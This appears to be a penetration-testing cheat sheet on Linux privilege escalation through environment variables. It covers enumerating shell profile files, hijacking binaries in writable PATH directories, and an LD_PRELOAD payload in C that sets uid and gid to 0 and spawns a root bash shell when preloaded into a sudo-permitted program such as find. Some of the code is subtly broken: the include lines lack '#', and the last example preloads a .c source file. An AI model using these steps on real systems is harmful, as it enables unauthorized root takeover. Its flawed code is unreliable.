# General
```
cat /etc/profile 
cat /etc/bashrc 
cat ~/.bash_profile 
cat ~/.bashrc 
cat ~/.bash_logout 
env set 
```

# $PATH Variable

## Background
- PATH variable is an environment variable that specifies where executable programs are located. 
- If you type in $PATH in a Unix machine, it will output the directories where various executables are stored. 
- System tries to identify programs in the file locations of the variable going from left to right.

## Attack Vector
1. Identify any programs that redefined the PATH variable as part of execution or identify where the default PATH variable points to.  
2. Evaluate the permissions of the folder locations in the PATH variable to see if we have write access to any of them. 
3. If we have write access to any of the folders we can delete the legitimate binary in the folder location and replace it with a malicious one that is executed by a program or Cron job.

# $LD_PRELOAD Variable

## Background
- LD_PRELOAD is an environment variable that can be set to point to any shared libraries specified. The dynamic linker on the Unix system will load these shared libraries before other libraries. 
- If we have SUDO access to a program that needs to load libraries for operation and also have access to the LD_PRELOAD variable, we can force the program to load and execute our malicious libraries first before the legitimate ones.

## Attack Vector
1. Create a malicious program 
```
include <stdio.h> 
include <sys/types.h>  
include <stdlib.h> 

void _init()  
{ unsetenv("LD_PRELOAD"); 
  setgid(0); 
  setuid(0);  
  system("/bin/bash"); 
} 
```

2. Compile programm if necessary. 
3. Load the new library executable first when running a program we have sudo privileges to and we get root. 
```
Sudo LD_PRELOAD=[path to malicious program] [normal sudo program]
```
```
Sudo LD_PRELOAD=/tmp/bad.c find
```
